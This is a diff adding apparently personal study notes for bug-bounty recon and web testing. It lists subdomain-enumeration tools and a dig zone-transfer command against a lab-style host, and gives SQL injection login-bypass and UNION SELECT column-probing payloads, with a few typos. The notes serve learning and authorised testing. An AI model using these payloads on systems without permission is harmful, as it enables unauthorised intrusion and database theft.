@@ -1,0 +1,62 @@
+Burpsuite extensions :
+    Retire.JS //search for vulnerable js files 
+
+Recon for Bug bounty:
+
+    1. Basic Recon
+        Wappalyzer
+        crt.sh
+        built with
+        wayback
+        nslookup
+        whois
+
+    2. Sub domain hunting
+        Tools:
+        waybackurls
+        theHarvester
+        Sublist3r //some problem
+        subfinder //need go for installation
+        assetfinder
+        amass
+        find domain
+
+    3. Github Recon    
+     
+    4. Probe the subdomains
+        httprobe :
+        checking for the valid subdomains
+        ex - cat domian.txt | httprobe
+
+        urlprobe
+
+    
+
+--------------Tools--------------
+    zone transfer vulns //usually in prot 53 
+    tool :
+    dig :
+    ex - dig axfr @10.10.10.123 friendzone.red >> zone //output file
+
+    for sorting the output :
+    cat zone | grep friendzone | grep IN | wk '{print $1}' | sort -u  
+
+Directory Traversal:
+Tool: 
+for automation the dirctory traversal : Dotdotpwn
+
+SQL Injection:
+bypassing the login: 
+
+asdf' or 1=1 //always true condition ;# //thats why its dont check for the password
+and let u in!
+
+finding a column containing: 
+'+UNION+SELECT+NULL,NULL,NULL-- 
+this payload allows you to find how mnny column in the database
+
+finding a column containing text:
+'+UNION+SELECT+'abcdef',NULL,NULL--
+this payload allows you to find which column contain the text 
+    
+
